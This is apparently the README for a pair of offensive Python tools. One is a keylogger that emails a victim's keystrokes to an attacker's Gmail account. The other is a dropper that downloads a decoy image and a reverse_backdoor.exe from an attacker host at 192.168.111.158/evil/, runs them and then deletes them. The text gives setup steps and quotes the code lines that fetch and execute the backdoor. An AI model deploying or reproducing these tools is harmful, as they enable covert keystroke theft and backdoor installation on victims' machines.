A keylogger program is a program that relays information about the victim's keystrokes to the attacker.

usage :
ex) python zlogger.py

****Cautions for using this program***** 
In the zlogger.py code, you need to change the first line: keylogger_instance = keylogger.Keylogger(time,your id,your password).
time : Determines how often you want to receive reports. In this case, time is in seconds, so if it's 2 minutes, you would write 120.

your id: This is the attacker's google email id, which is used to log in because we record and report the results to the attacker's email.

your password: This is the attacker's GOOGLE email PASSWORD that is used to log in, as we will record and report the result to the attacker's email.

A download_execute_and_report program is a program that causes legitimate and malicious files to be downloaded together.

usage :
ex) python download_execute_and_report.py

*********************Cautions when using the program**********************
When using this program, you need to specify the path of the normal file and the path where the malicious program is stored because you need to download it.
download("http://192.168.111.158/evil/car.jpg")
subprocess.Popen("car.jpg", shell=True)
--> download("Path to the healthy file")
download("http://192.168.111.158/evil/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)
--> download("Path to malicious file")
os.remove("car.jpg")
os.remove("reverse_backdoor.exe")
--> name the file and program.
ex)
os.remove("legitimate programs (or files)")
os.remove("Malicious programs (or files)")
